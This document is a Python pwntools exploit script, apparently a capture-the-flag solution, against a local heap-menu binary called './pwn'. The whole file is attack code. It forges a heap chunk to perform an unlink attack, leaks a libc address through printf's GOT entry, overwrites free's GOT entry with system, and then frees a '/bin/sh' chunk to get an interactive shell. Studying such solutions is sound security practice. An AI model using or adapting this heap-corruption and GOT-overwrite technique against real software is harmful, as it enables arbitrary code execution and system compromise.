from pwn import *
context(os='linux', arch='amd64', log_level='debug')
p=process("./pwn")
elf=ELF("/lib/x86_64-linux-gnu/libc-2.19.so")
e=ELF("./pwn")
def g():
    gdb.attach(p)
    raw_input()

def show():
    p.recvuntil("Your choice:")
    p.sendline('1')

def add(index, data):
    p.recvuntil('choice:')
    p.sendline('2')
    p.recvuntil('name:')
    p.sendline(str(index))
    p.recvuntil('servant:')
    p.send(data)

def change(index,length,data):
    p.recvuntil('choice:')
    p.sendline('3')
    p.recvuntil('servant:')
    p.sendline(str(index))
    p.recvuntil('servant name:')
    p.sendline(str(length))
    p.recvuntil('the new name of the servnat:')
    p.send(data)

def remove(index):
    p.recvuntil('choice:')
    p.sendline('4')
    p.recvuntil('servant:')
    p.sendline(str(index))




add(16,"aaaa"+'\n')
add(32,"bbbb"+'\n')
add(144,"cccc"+'\n')
add(10,"dddd"+'\n')
add(16,"/bin/sh"+'\n')

change(1,48,p64(0)+p64(0x21)+p64(0x6020d8-8*3)+p64(0x6020d8-8*2)+p64(0x20)+p64(0xa0)+'\n')
remove(2)

printf_got=e.got["printf"]

change(1,17,p64(0x10)+p64(printf_got)+'\n')


show()
p.recvuntil("0 : ")
libc_addr=u64(p.recv(6).ljust(8,'\x00'))-elf.symbols["printf"]
print "libc_addr==="+hex(libc_addr)


system_addr=libc_addr+0x46590

print "system="+hex(system_addr)

free_got=e.got["free"]

change(1,17,p64(0x10)+p64(free_got)+'\n')

change(0,9,p64(system_addr)+'\n')

remove(4)

p.interactive()
